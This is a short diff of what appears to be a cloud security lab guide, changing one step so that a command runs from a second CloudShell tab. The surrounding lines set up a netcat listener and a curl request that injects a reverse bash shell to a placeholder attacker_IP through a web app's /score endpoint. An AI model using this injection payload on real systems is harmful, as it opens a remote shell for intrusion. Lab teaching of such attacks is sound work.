@@ -17,7 +17,7 @@ ssh -i ~/lab_key.pem ubuntu@attacker_IP
 ```bash
 nc -lvp 5789
 ```
-3. Run the following command from your laptop:
+3. Open another CloudShell tab and run the command:
 ```bash
 curl -X POST http://website_IP/score -d '""; bash -c "/bin/bash -i > /dev/tcp/attacker_IP/5789 0<&1 2>&1" #'
 ```
